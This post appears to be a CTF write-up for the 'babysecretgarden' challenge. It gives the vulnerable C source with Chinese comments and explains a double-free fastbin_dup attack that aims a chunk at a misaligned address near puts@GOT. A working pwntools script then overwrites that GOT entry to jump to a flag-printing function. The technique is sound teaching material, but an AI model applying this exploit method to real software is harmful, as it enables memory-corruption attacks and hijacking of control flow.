---
layout: post
title: babysecretgarden fastbin attack
excerpt: "fastbin attack"
categories: [Writeup]
comments: true
---

```
#include <stdio.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#define TIMEOUT 60


struct flower{			//结构体
	int vaild ;
	char *name ;
	char color[24] ;
};


struct flower* flowerlist[100] ;		
unsigned int flowercount = 0 ;



void menu(){			//就是打印一些东西,不用看
	puts("");
	puts("☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ");
	puts("☆         Baby Secret Garden      ☆ ");
	puts("☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ");
	puts("");
	puts("  1 . Raise a flower " );
	puts("  2 . Visit the garden ");
	puts("  3 . Remove a flower from the garden");
	puts("  4 . Clean the garden");
	puts("  5 . Leave the garden");
	puts("");
	printf("Your choice : ");
}

int add(){
	struct flower *newflower = NULL ;		//首先是创建一个空的结构体指针
	char *buf = NULL ;
	unsigned size =0;
	unsigned index ;
	if(flowercount < 100){							//一个全局变量
		newflower = malloc(sizeof(struct flower));
		memset(newflower,0,sizeof(struct flower));	//malloc一个新的结构体并置零
		printf("Length of the name :");
		if(scanf("%u",&size)== EOF) exit(-1);
		buf = (char*)malloc(size);					//输入name的长度并malloc相应的大小
		if(!buf){
			puts("Alloca error !!");
			exit(-1);
		}
		printf("The name of flower :");
		read(0,buf,size);							//输入name并保存,并将结构体指针指向其中
		newflower->name = buf ;
		printf("The color of the flower :");
		scanf("%23s",newflower->color);				//输入color,保存在color中
		newflower->vaild = 1 ;
		for(index = 0 ; index < 100 ; index++ ){
			if(!flowerlist[index]){
				flowerlist[index] = newflower ;		//遍历所有flower,然后根据指针是否被占用,进行赋值
				break ;
			}
		}
		flowercount++ ;
		puts("Successful !");
	}else{
		puts("The garden is overflow");
	}
}

int del(){
	unsigned int index ;
	if(!flowercount){
		puts("No flower in the garden");
	}else{
		printf("Which flower do you want to remove from the garden:");
		scanf("%d",&index);
		if(index < 0 ||index >= 100 || !flowerlist[index]){
			puts("Invalid choice");
			return 0 ;
		}
		(flowerlist[index])->vaild = 0 ;		//结构体的valid置零
		free((flowerlist[index])->name);		//把名称的部分free掉,但是没有置零,存在垂悬指针,可以进行double free
		puts("Successful");
	}
}

void magic(){		//最终运行这个方法就行了
    int fd ;
    char buffer[100];
    fd = open("/home/babysecretgarden/flag",O_RDONLY);
    read(fd,buffer,sizeof(buffer));
    close(fd);
    printf("%s",buffer);
    exit(0);
}

void clean(){
	unsigned index ;
	for(index = 0 ; index < 100 ; index++){	//若指针存在并且valid为零
		if(flowerlist[index] && (flowerlist[index])->vaild == 0){
			free(flowerlist[index]);
			flowerlist[index] = NULL;	//free并置零,貌似没有漏洞
			flowercount--;
		}
	}
	puts("Done!");
}

int visit(){
	unsigned index ;
	if(!flowercount){
		puts("No flower in the garden !");
	}else{
		for(index = 0 ; index < 100 ; index++){		//如果存在,就输出
			if(flowerlist[index] && (flowerlist[index])->vaild){
				printf("Name of the flower[%u] :%s\n",index,(flowerlist[index])->name);
				printf("Color of the flower[%u] :%s\n",index,(flowerlist[index])->color);
			}
		}	
	}
}

void handler(int signum){		//这个就是一个timeout
	puts("timeout");
	exit(1);
}
void init(){		//这个不知道有什么用
	int fd;
	fd = open("/dev/urandom",0);
	close(fd);
	setvbuf(stdout,0,2,0);
	signal(SIGALRM,handler);
	alarm(TIMEOUT);
}


int main(){
	init();
	int choice ;
	char buf[10];
	while(1){
		menu();
		read(0,buf,8);
		choice = atoi(buf);		//读取choice进行选择
		switch(choice){
			case 1:
				add();
				break ;
			case 2:
				visit();
				break ;
			case 3:
				del();
				break ;
			case 4:
				clean();
				break ;
			case 5:
				puts("See you next time.");
				exit(0);
			default :
				puts("Invalid choice");
				break ;
		}
	}
}
```
我们可以考虑通过double free,和fastbin_dup将堆的位置弄在put_got附近,然后再修改该堆空间,修改put_got,期间用到为了满足fastbin大小的要求,需要对put_got进行错位查找

通常下我们再got位置附近错位,会找到0x60的位置,那么我们申请堆空间的时候,大小要填写0x50

最终的exp如下
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

r = process('./secretgarden')

def raiseflower(length,name,color):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(color)

def visit():
    r.recvuntil(":")
    r.sendline("2")

def remove(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def clean():
    r.recvuntil(":")
    r.sendline("4")


'''
0x601ffa:	0x1e28000000000000	0xe150000000000060
0x60200a:	0x195000007ffff7ff	0x079600007ffff7df

'''
if __name__ == '__main__':
    magic = 0x400c7b
    fake_chunk = 0x601ffa
    puts_got = 0x602020
    raiseflower(0x50,'aaaa','red')  #0
    raiseflower(0x50,'aaaa','red')  #1
    remove(1)
    remove(0)
    remove(1)
    raiseflower(0x50, p64(0x601ffa), 'red')  #先申请的1
    raiseflower(0x50, 'aaaa', 'red')  #再申请的0
    raiseflower(0x50, 'aaaa', 'red')  #再申请的1
    raiseflower(0x50,'a'*22+p64(magic) , 'red')  #这次申请到了put_got附近
```